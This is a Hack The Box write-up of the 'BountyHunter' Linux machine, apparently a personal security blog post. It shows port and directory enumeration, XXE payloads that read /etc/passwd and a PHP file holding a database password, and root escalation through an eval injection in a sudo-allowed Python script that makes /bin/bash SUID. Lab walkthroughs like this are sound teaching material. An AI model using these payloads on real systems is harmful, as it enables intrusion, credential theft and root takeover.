---
title: BountyHunter Write-up
date: 2022-09-27 09:00:00 +0200
categories: [Hack The Box, Linux]
tags: [htb, linux, xxe, sudo]
img_path: /assets/img/posts/bountyhunter/
image:
    path: cover.png
    width: 700
    height: 300
comments: true
toc: true
---

## Enumeration
---

### Nmap

First, we will start enumerating the open ports on the victim machine. To do that, we will use [nmap](https://github.com/nmap/nmap). We will specify that we want to scan all the port range, that we only want to display the open ports and that we will use the TCP Syn Port Scan scanning method. Optionally, we will specify explicitly that we don't want to perform host discovery and DNS resolution. This will speed up the process. Lastly, we will export all the evidence to a file called `allPorts`:

```bash
nmap -p- -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.11.100
```

```text
# Nmap 7.91 scan initiated Tue Aug  3 18:20:54 2021 as: nmap -p- -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.11.100
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.100 ()	Status: Up
Host: 10.10.11.100 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///	Ignored State: closed (65533)
# Nmap done at Tue Aug  3 18:21:08 2021 -- 1 IP address (1 host up) scanned in 13.80 seconds
```
{: file="enum/allPorts" }

Once we know the open ports on the victim machine, we will perform a more exhaustive scan to try to discover services and versions running on the server. We will save them in a file called `targeted`:

```bash
nmap -sC -sV -p22,80 -oN targeted 10.10.11.100
```

```text
# Nmap 7.91 scan initiated Tue Aug  3 12:54:08 2021 as: nmap -sC -sV -p22,80 -oN targeted 10.10.11.100
Nmap scan report for 10.10.11.100
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug  3 12:54:17 2021 -- 1 IP address (1 host up) scanned in 8.93 seconds
```
{: file="enum/targeted" }

As we see, we only have port 22 (SSH) and port 80 (HTTP) open.

### Web Server

We will start by enumerating the web server.

If we access the web server using the browser, we will see the following:

![Desktop View](web1.png){: w="700" h="400" }
_Web Server Index_

We can see the page is pretty simple, so we will examine its different resources. In the portal tab we will see the following:

![Desktop View](web2.png){: w="700" h="400" }
_Web Server Portal Tab_

This hyperlink will redirect us to the `log_submit.php` page that will look as follows:

![Desktop View](web3.png){: w="700" h="400" }
_log_submit.php_

### Fuzzing

We don't have a clear attack vector yet, so we will continue exploring. First of all, we will fuzz the web server in order to find directories in the root of it. To do that, we will use the tool [wfuzz](https://github.com/xmendez/wfuzz) along with the `directory-list-2.3-medium.txt` wordlist:

```bash
wfuzz -c --hc=404 -f fuzzRoot,raw -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.100/FUZZ
```

```text
Target: http://10.10.11.100/FUZZ
Total requests: 220560
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
00001:  C=200    388 L	    1470 W	  25168 Ch	  "# directory-list-2.3-medium.txt"
00003:  C=200    388 L	    1470 W	  25168 Ch	  "# Copyright 2007 James Fisher"
00007:  C=200    388 L	    1470 W	  25168 Ch	  "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"
00014:  C=200    388 L	    1470 W	  25168 Ch	  "http://10.10.11.100/"
00012:  C=200    388 L	    1470 W	  25168 Ch	  "# on at least 2 different hosts"
00013:  C=200    388 L	    1470 W	  25168 Ch	  "#"
00011:  C=200    388 L	    1470 W	  25168 Ch	  "# Priority ordered case sensitive list, where entries were found"
00010:  C=200    388 L	    1470 W	  25168 Ch	  "#"
00009:  C=200    388 L	    1470 W	  25168 Ch	  "# Suite 300, San Francisco, California, 94105, USA."
00006:  C=200    388 L	    1470 W	  25168 Ch	  "# Attribution-Share Alike 3.0 License. To view a copy of this"
00008:  C=200    388 L	    1470 W	  25168 Ch	  "# or send a letter to Creative Commons, 171 Second Street,"
00005:  C=200    388 L	    1470 W	  25168 Ch	  "# This work is licensed under the Creative Commons"
00002:  C=200    388 L	    1470 W	  25168 Ch	  "#"
00004:  C=200    388 L	    1470 W	  25168 Ch	  "#"
00084:  C=301      9 L	      28 W	    316 Ch	  "resources"
00291:  C=301      9 L	      28 W	    313 Ch	  "assets"
00550:  C=301      9 L	      28 W	    310 Ch	  "css"
00953:  C=301      9 L	      28 W	    309 Ch	  "js"
45240:  C=200    388 L	    1470 W	  25168 Ch	  "http://10.10.11.100/"

Total time: 0
Processed Requests: 46079
Filtered Requests: 46060
Requests/sec.: 0
```
{: file="enum/fuzzRoot" }

We can see that we have some directories that have resources related to the web server. If we try to access these directories, we will notice that the only accessible one is `resources`. This directory will contain the following files:

![Desktop View](fuzz1.png){: w="700" h="400" }
_Resources directory_

There are two files that will attract our attention, `README.txt` and `bountylog.js`. If we inspect them:

```js
function returnSecret(data) {
	return Promise.resolve($.ajax({
            type: "POST",
            data: {"data":data},
            url: "tracker_diRbPr00f314.php"
            }));
}

async function bountySubmit() {
	try {
		var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>${$('#exploitTitle').val()}</title>
		<cwe>${$('#cwe').val()}</cwe>
		<cvss>${$('#cvss').val()}</cvss>
		<reward>${$('#reward').val()}</reward>
		</bugreport>`
		let data = await returnSecret(btoa(xml));
  		$("#return").html(data)
	}
	catch(error) {
		console.log('Error:', error);
	}
}
```
{: file="content/bountylog.js" }

If we analyze this file, we can observe that it is a simple JavaScript file that is responsible of making an HTTP POST request to a PHP resource. This POST request contains various XML parameters that are encoded in Base64 and sent to the `tracker_diRbPr00f314.php` resource. As we can see, user input is not being sanitized, so we can guess that the server is vulnerable to XXE (XML External Entity) Injection.

```text
Tasks:

[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
[X] Write tracker submit script
[ ] Connect tracker submit script to the database
[X] Fix developer group permissions
```
{: file="content/README.txt" }

In the `README.txt` we will have a TODO list. Two tasks have been completed: writing tracker submit script (we assume that this is the `bountylog.js`) and fix developer group permissions. But the two other tasks seem not to be completed. These tasks are: connecting the tracker submit script to the database and disabling `test` account. We will keep this information in mind.

We will continue fuzzing the web server for valuable information. We have seen that the web server uses `.php` files, so we will fuzz in the web server's root based on this extension. We will do that with the following command:

```bash
wfuzz -c --hc=404 -f fuzzRootPHP,raw -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.100/FUZZ.php

```

```text
Target: http://10.10.11.100/FUZZ.php
Total requests: 220560
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
00001:  C=200    388 L	    1470 W	  25168 Ch	  "# directory-list-2.3-medium.txt"
00007:  C=200    388 L	    1470 W	  25168 Ch	  "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"
00003:  C=200    388 L	    1470 W	  25168 Ch	  "# Copyright 2007 James Fisher"
00015:  C=200    388 L	    1470 W	  25168 Ch	  "index"
00014:  C=403      9 L	      28 W	    277 Ch	  "http://10.10.11.100/.php"
00013:  C=200    388 L	    1470 W	  25168 Ch	  "#"
00012:  C=200    388 L	    1470 W	  25168 Ch	  "# on atleast 2 different hosts"
00011:  C=200    388 L	    1470 W	  25168 Ch	  "# Priority ordered case sensative list, where entries were found"
00010:  C=200    388 L	    1470 W	  25168 Ch	  "#"
00009:  C=200    388 L	    1470 W	  25168 Ch	  "# Suite 300, San Francisco, California, 94105, USA."
00006:  C=200    388 L	    1470 W	  25168 Ch	  "# Attribution-Share Alike 3.0 License. To view a copy of this"
00008:  C=200    388 L	    1470 W	  25168 Ch	  "# or send a letter to Creative Commons, 171 Second Street,"
00005:  C=200    388 L	    1470 W	  25168 Ch	  "# This work is licensed under the Creative Commons"
00002:  C=200    388 L	    1470 W	  25168 Ch	  "#"
00004:  C=200    388 L	    1470 W	  25168 Ch	  "#"
00368:  C=200      5 L	      15 W	    125 Ch	  "portal"
00848:  C=200      0 L	       0 W	      0 Ch	  "db"
45240:  C=403      9 L	      28 W	    277 Ch	  "http://10.10.11.100/.php"

Total time: 0
Processed Requests: 125506
Filtered Requests: 125488
Requests/sec.: 0
```
{: file="content/fuzzRootPHP" }

We can see two files: `portal.php` (we already knew about it) and `db.php`. This last file will attract our attention as this type of file often contains credentials. We can't read it as it is being interpreted by the web server, so we will keep it in mind for the future.

## User Shell
---

### XXE (External XML Entity) Injection

As we have seen in the previous enumeration phase, `log_submit.php` sends to `tracker_diRbPr00f314.php` via a POST HTTP request, an XML file encoded in Base64 with the parameters found in the web form.

We will run a simple test in the form:

![Desktop View](xxe1.png){: w="700" h="400" }
_Simple test in web form_

We will intercept this request using the popular [Burpsuite](https://portswigger.net/burp/communitydownload) proxy:

![Desktop View](xxe2.png){: w="700" h="400" }
_Burpsuite Intercept_

As we can see, we have a big string that we guess is Base64, so we will copy this data and paste it into the Burpsuite decoder:

![Desktop View](xxe3.png){: w="700" h="400" }
_Burpsuite Decoder_

Since we are dealing with an HTTP request, we suppose it is Base64 encoded and URL encoded. Once we have decoded the string, we can see that it corresponds to an XML file with the same structure that we have seen in `bountylog.js`.

Now that we know we can send an encoded XML file and that the server might be interpreting it, we will test for XXE Injection. To do this, we will use the XML file that we just decoded as a template for our payload. We will create an external entity in this file, named `example`, that contains a `'test'`string. Then, we will replace one of the XML tags content (in this case, we choose `reward`) with a reference to the external entity that we have just created. The resulting payload will look like this:

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [
    <!ENTITY example "test">]>
		<bugreport>
		<title>a</title>
		<cwe>a</cwe>
		<cvss>a</cvss>
		<reward>&example;</reward>
		</bugreport>
```

Then, we will proceed to encode this payload. First, we will encode it in Base64 and then, in URL encode:

![Desktop View](xxe4.png){: w="700" h="400" }
_Burpsuite Decoder_

Lastly, we will insert the created payload into the data parameter of the HTTP POST request:

![Desktop View](xxe5.png){: w="700" h="400" }
_Burpsuite HTTP Request_

Once we send the HTTP request, we can see what happens in the browser:

![Desktop View](xxe6.png){: w="700" h="400" }
_Browser_

We can see that our external entity named `example`, that contained the `'test'` string, is being represented in the `reward` field. So now we can say that the server is vulnerable to XXE Injection.

Now, we will try to read files from the target machine. To do this, we can use the wrapper named `file`. In this case, we will list the `/etc/passwd`{: .filepath} file, using the following payload and repeating the process explained above:

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE reward [ 
	<!ELEMENT reward ANY >
	<!ENTITY file SYSTEM "file:///etc/passwd" >]>
		<bugreport>
		<title>a</title>
		<cwe>a</cwe>
		<cvss>a</cvss>
		<reward>&file;</reward>
		</bugreport>
```

![Desktop View](xxe7.png){: w="700" h="400" }
_/etc/passwd displaying_

We can see that we are being displayed the `/etc/passwd`{: .filepath} of the target machine. This is always useful to identify the users of the machine, since we can see their home directories and if they have a shell assigned or not. In this case, we have the users `development` and `root`.

As we remember from the enumeration phase, we had a file called `db.php` that we could not read because it was being interpreted by the web server. Since we are able to read files from the victim machine, we will try to use a `PHP` wrapper that encodes the content of a file in Base64 and displays it. We will use it to read the contents of the `db.php` file. To do this, we will use the following payload:

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE reward [ 
	<!ELEMENT reward ANY >
	<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=db.php" >]>
		<bugreport>
		<title>a</title>
		<cwe>a</cwe>
		<cvss>a</cvss>
		<reward>&file;</reward>
		</bugreport>
```

Once we have got the response from the server, we will decode the displayed Base64 string using the following command:

![Desktop View](xxe8.png){: w="700" h="400" }
_db.php decoding_

```text
admin:m19RoAU0hP41A1sTsq6K
```
{: file="credentials/sshCreds.txt" }

We can see that we have got some credentials. As we don't have any login panel on the web server, we will try to determine if the user is reusing this password. We will try the found credentials in the other service that we identified in the enumeration phase, SSH. We already know that there is a user called `development`, as we have seen it in the `/etc/passwd`{: .filepath} file. We will try to connect with the following command and the found password:

```bash
ssh development@10.10.11.100
```

![Desktop View](xxe9.png){: w="700" h="400" }
_whoami development_

We can see that we have a shell as the user `development`. So we proceed to read the `user.txt` flag located in the `/home/development/`{: .filepath} directory.

## Root Shell
---

### Passwordless sudo

Now that we are the `development` user, we will try to escalate privileges to become the `root` user.

We will start our enumeration by listing the commands that we can run as sudo. We can use the following command for that:

```bash
sudo -l
```

![Desktop View](sudo1.png){: w="700" h="400" }
_sudo privileges_

We can see that we have the capacity to execute the `/opt/skytrain_inc/ticketValidator.py`{: .filepath } script with `python3.8`, being the `root` user and not having to provide a password.

### Python Script Source Code Analysis

We will proceed to analyze the `/opt/skytrain_inc/ticketValidator.py`{: .filepath } file (some parts of the script are commented to better understand how it works):

```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    # Checks for .md extension and loads file
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for irregularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):  # i: Number of line, x: Content of the line 
        if i == 0:
            if not x.startswith("# Skytrain Inc"): # First line content
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):  # Second line content
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):       # Third line content
            code_line = i+1
            continue

        if code_line and i == code_line:           # Fourth line content
            if not x.startswith("**"):             # Has to start with **
                return False
            ticketCode = x.replace("**", "").split("+")[0] # Has to have a + sign
            if int(ticketCode) % 7 == 4:           # The first operand of the sum needs to have a 4 reminder when divided by 7,  'x * 7 + 4 = ticketCode'
                validationNumber = eval(x.replace("**", "")) # Evaluates the complete expression after removing the ** signs
                if validationNumber > 100:         # We have done the eval so this condition does not really matter
                    return True
                else:
                    return False
    return False

def main():
    # Main function
    fileName = input("Please enter the path to the ticket file.\n") 
    ticket = load_file(fileName)          
    #DEBUG print(ticket)
    result = evaluate(ticket) 
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close


main()
```
{: file="scripts/ticketValidator.py" }

We can see that this script is pretty simple. First, there is a prompt with an input to enter the ticket that we want to validate. Then, a validation is done to see if the extension of the file is `.md`. Following that, the contents of each line of the file are validated, each with a different set of conditions. Lastly, one of the lines, exactly the last one, is being used in an `eval` expression. Once again, the user input is not being sanitized and, on top of that, is being passed to the `eval` function as an argument. Since we know the structure that the file has to have and that one of the lines is being evaluated, we will create a malicious payload.

We will try to execute the following command on it. This lets us change the permissions of the bash binary to `SUID` (Set User ID), thus making it possible to execute it in privileged mode (as `root`) while being a non-privileged user:

```bash
chmod 4755 /bin/bash
```

Knowing the needed structure and the payload we want to execute, we will construct the following file:

```python
# Skytrain Inc
## Ticket to hola
__Ticket Code:__
**11+100 and __import__("os").system("chmod 4755 /bin/bash")**
```
{: file="scripts/test.md"}

Once we have our payload prepared, we will execute the `ticketvalidator.py` as `root` and we will indicate our freshly created payload as the ticket to validate:

![Desktop View](sudo2.png){: w="700" h="400" }
_Exploiting sudo privileges_

After executing it, we can see that the `/bin/bash`{: .filepath} binary has `SUID` permission, so we can use the following command to execute it as the `root` user:

```bash
bash -p
```

![Desktop View](sudo3.png){: w="700" h="400" }
_root shell_

We can see that we are the `root` user so we proceed to visualize the `root.txt`flag in the `/root/`{: .filepath} directory.
